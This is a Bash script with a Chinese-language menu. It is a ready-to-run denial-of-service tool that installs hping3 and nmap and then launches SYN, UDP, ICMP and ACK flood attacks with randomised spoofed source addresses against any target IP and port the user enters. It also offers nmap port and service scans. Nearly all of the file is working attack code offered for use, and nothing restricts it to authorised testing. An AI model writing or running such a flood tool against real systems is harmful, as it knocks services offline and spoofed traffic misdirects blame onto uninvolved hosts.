#!/bin/bash
export LANG=en_US.UTF-8

# 初始化函数
initself() {
    selfversion='25.04.01'
    datevar=$(date +%Y-%m-%d_%H:%M:%S)
    menuname='首页'
    parentfun=''

    # 颜色定义
    _red() {
        printf '\033[0;31;31m%b\033[0m' "$1"
        echo
    }
    _green() {
        printf '\033[0;31;32m%b\033[0m' "$1"
        echo
    }
    _yellow() {
        printf '\033[0;31;33m%b\033[0m' "$1"
        echo
    }
    _blue() {
        printf '\033[0;31;36m%b\033[0m' "$1"
        echo
    }


    # 等待输入
    waitinput() {
        echo
        read -n1 -r -p "按任意键继续...(退出 Ctrl+C)"
    }

    # 加载动画
    loading() {
        local pid=$1
        local delay=0.1
        local spinstr='|/-\'
        tput civis # 隐藏光标
        while kill -0 $pid 2>/dev/null; do
            local temp=${spinstr#?}
            printf "\r\033[0;31;36m[ %c ] 正在执行攻击...\033[0m" "$spinstr"
            local spinstr=$temp${spinstr%"$temp"}
            sleep $delay
        done
        tput cnorm        # 恢复光标
        printf "\r\033[K" # 清除行
    }

    # 字符跳动效果
    jumpfun() {
        local str=$1
        local delay=${2:-0.1}
        for ((i = 0; i < ${#str}; i++)); do
            printf '\033[0;31;36m%b\033[0m' "${str:$i:1}"
            sleep "$delay"
        done
        echo
    }

    # 检查依赖
    check_deps() {
        local deps=("hping3" "nmap" "curl")
        for dep in "${deps[@]}"; do
            if ! command -v "$dep" &>/dev/null; then
                _yellow "$dep 未安装，正在安装..."
                apt update && apt install "$dep" -y
            fi
        done
    }

    # 菜单头部
    menutop() {
        clear
        _green '                          ┌──►   '
        _green '─────────────────────#────┼────► '
        _green '                          └──►   '
        _blue "v: $selfversion"
        echo
        _yellow "当前菜单: $menuname "
        echo
    }

    # 菜单渲染
    menu() {
        menutop
        local options=("$@")
        local num_options=${#options[@]}
        local max_len=0

        for ((i = 0; i < num_options; i += 2)); do
            local str_len=${#options[i]}
            ((str_len > max_len)) && max_len=$str_len
        done

        for ((i = 0; i < num_options; i += 4)); do
            printf "%s%*s  " "$((i / 2 + 1)): ${options[i]}" "$((max_len - ${#options[i]}))"
            [[ -n "${options[i + 2]}" ]] && printf "$((i / 2 + 2)): ${options[i + 2]}"
            echo -e "\n"
        done

        _blue "q: 退出  b: 返回  0: 首页  s: 设置"
        echo
        read -ep "请输入命令号: " number

        case "$number" in
        [1-$((num_options / 2))])
            local action_index=$((2 * (number - 1) + 1))
            parentfun=${options[action_index]}
            ${options[action_index]}
            waitinput
            ${FUNCNAME[3]}
            ;;
        0) main ;;
        b) ${FUNCNAME[3]} ;;
        q) exit ;;
        s) settings ;;
        *)
            _red '输入错误'
            waitinput
            main
            ;;
        esac
    }
}

# 设置菜单
settings() {
    menuname="设置"
    change_timeout() {
        read -ep "请输入超时时间(秒): " timeout
        export ATTACK_TIMEOUT=$timeout
        _green "超时设置为: $timeout 秒"
    }

    options=("更改超时时间" change_timeout)
    menu "${options[@]}"
}

# HPING3攻击函数
hping3_attack() {
    menuname="HPING3攻击"

    execute_attack() {
        local attack_type=$1
        local attack_flag=$2

        read -ep "目标 IP: " target_ip
        read -ep "数据包大小(默认120): " packet_size
        packet_size=${packet_size:-120}
        read -ep "持续时间(秒，默认60): " duration
        duration=${duration:-60}

        # 如果是 ICMP 攻击，不需要端口
        if [[ "$attack_type" == "ICMP" ]]; then
            _yellow "攻击类型: $attack_type"
            _yellow "目标: $target_ip"
            _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood --rand-source $target_ip"
        else
            read -ep "目标端口(默认80): " target_port
            target_port=${target_port:-80}
            _yellow "攻击类型: $attack_type"
            _yellow "目标: $target_ip:$target_port"
            _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood --rand-source $target_ip"
        fi

        echo
        waitinput
        _green "开始执行攻击..."
        echo
        if [[ "$attack_type" == "ICMP" ]]; then
            hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood --rand-source "$target_ip" &
        else
            hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood --rand-source "$target_ip" &
        fi
        local pid=$!
        loading $pid
        wait $pid
        _green "攻击完成"

    }

    options=(
        "SYN Flood" "execute_attack SYN -S"
        "UDP Flood" "execute_attack UDP --udp"
        "ICMP Flood" "execute_attack ICMP --icmp"
        "ACK Flood" "execute_attack ACK -A"
    )
    menu "${options[@]}"
}

# NMAP扫描函数
nmap_scan() {
    menuname="NMAP扫描"

    execute_scan() {
        local scan_type=$1
        local scan_flag=$2

        read -ep "目标 IP/域名: " target
        _yellow "执行 $scan_type 扫描: $target"

        nmap $scan_flag "$target" &
        local pid=$!
        loading $pid
        wait $pid
        _green "扫描完成"
    }

    options=(
        "快速扫描" "execute_scan Quick -F"
        "全面扫描" "execute_scan Comprehensive -A"
        "端口扫描" "execute_scan Ports -p-"
    )
    menu "${options[@]}"
}

# 主菜单
main() {
    menuname='首页'
    check_deps
    options=(
        "HPING3攻击" hping3_attack
        "NMAP扫描" nmap_scan
        "设置" settings
    )
    menu "${options[@]}"
}

# 初始化并启动
initself
main
